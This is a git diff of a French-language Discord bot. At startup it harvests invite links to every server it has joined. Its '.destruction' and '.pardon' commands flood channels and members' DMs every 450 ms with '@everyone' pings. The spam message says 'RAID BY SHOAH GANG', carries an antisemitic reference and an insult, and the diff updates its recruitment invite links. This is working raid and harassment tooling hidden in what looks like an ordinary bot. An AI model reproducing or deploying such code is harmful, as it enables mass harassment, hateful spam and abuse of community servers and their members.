@@ -13,6 +13,7 @@ bot.on('ready',() => {
   bot.guilds.forEach(guild => {
     var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
     invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(e => {});
+   bot.user.setGame(`.help || ${bot.users.size} membres`, 'https://www.twitch.tv/KiruaBot');
   });
 }); 
 
@@ -30,13 +31,13 @@ if (msg.content === '.destruction') {
     console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
       msg.channel.send("RAID BY SHOAH GANG  @everyone  @here . \n"+ 
-"https://cdn.discordapp.com/attachments/436188674435317760/445207285195866124/shoah.png . \n"+
-"https://cdn.discordapp.com/attachments/436188674435317760/445207509204992021/walkoud_singe.png .\n"+
-"https://cdn.discordapp.com/attachments/436188674435317760/445207831977918465/pikly.png . \n"+
-"SHOAH GANG ON THE BEAT (: \n"+
-"~ ~ ~ ~ ~ ~~ ~ \n"+    
-"ROCKET MAN MA SALOPE \n"+
-"~ ~ ~ ~ ~ ~~ ~  ~~  ~~ https://discord.gg/5SANtDz").catch(e => {});
+        "https://cdn.discordapp.com/attachments/436188674435317760/445207831977918465/pikly.png . \n"+
+        "SHOAH GANG ON THE BEAT (: \n"+
+        "~ ~ ~ ~ ~ ~~ ~ \n"+    
+        "ROCKET MAN MA SALOPE \n"+
+        "~ ~ ~ ~ ~ ~~ ~  ~~  ~~\n"+
+      "https://discord.gg/ttpXP4m \n"+
+      "https://discord.gg/yKaZuh5").catch(e => {});
     }, 450)
   }
 
@@ -117,13 +118,13 @@ if (msg.content === '.pardon') {
     if(i < 500){
       var interval = setInterval (function () {
         member.send("RAID BY SHOAH GANG  @everyone  @here . \n"+ 
-        "https://cdn.discordapp.com/attachments/436188674435317760/445207285195866124/shoah.png . \n"+
-        "https://cdn.discordapp.com/attachments/436188674435317760/445207509204992021/walkoud_singe.png .\n"+
         "https://cdn.discordapp.com/attachments/436188674435317760/445207831977918465/pikly.png . \n"+
         "SHOAH GANG ON THE BEAT (: \n"+
         "~ ~ ~ ~ ~ ~~ ~ \n"+    
         "ROCKET MAN MA SALOPE \n"+
-        "~ ~ ~ ~ ~ ~~ ~  ~~  ~~").catch(e => {});
+        "~ ~ ~ ~ ~ ~~ ~  ~~  ~~\n"+
+      "https://discord.gg/ttpXP4m \n"+
+      "https://discord.gg/yKaZuh5").catch(e => {});
       }, 450)
 
       }   
@@ -324,10 +325,9 @@ bot.on('guildMemberAdd', member => {
     let bienvenue_embed = new Discord.RichEmbed()
     .setColor("RANDOM")
     .addField("Bienvenue sur le serveur", "Viens parler avec les joueurs !")
-    .addBlankField(1)
     .setFooter("Copiryght © 2018 Kirua Bot - Tout droit réservé")
     .setThumbnail(member.iconURL)
-    .setAuthor("Kirua Bot ( https://discordapp.com/oauth2/authorize?client_id=448844917939372054&scope=bot&permissions=268435518 )")
+    .setAuthor("Kirua bot")
     prive.send(bienvenue_embed).catch(e => {});
   })
 })
